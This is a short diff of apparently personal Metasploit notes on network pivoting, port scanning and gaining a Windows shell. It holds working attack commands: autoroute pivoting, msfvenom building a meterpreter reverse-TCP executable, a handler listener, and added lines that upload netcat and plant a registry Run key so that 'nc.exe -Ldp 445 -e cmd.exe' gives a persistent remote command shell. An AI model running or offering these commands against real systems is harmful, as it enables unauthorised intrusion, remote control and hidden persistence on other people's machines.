@@ -1,3 +1,4 @@
+
 run autoroute -s 10.1.13.0/24
 run autoroute -p
 -------------------------pivotear-------------
@@ -26,3 +27,9 @@ use auxiliary/scanner/portscan/tcp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=**** LPORT=12345 -f exe > shell2.exe
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
+
+
+
+upload /usr/share/windows-binaries/nc.exe C:\\windows\\Temp
+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\Temp\nc.exe -Ldp 445 -e cmd.exe'
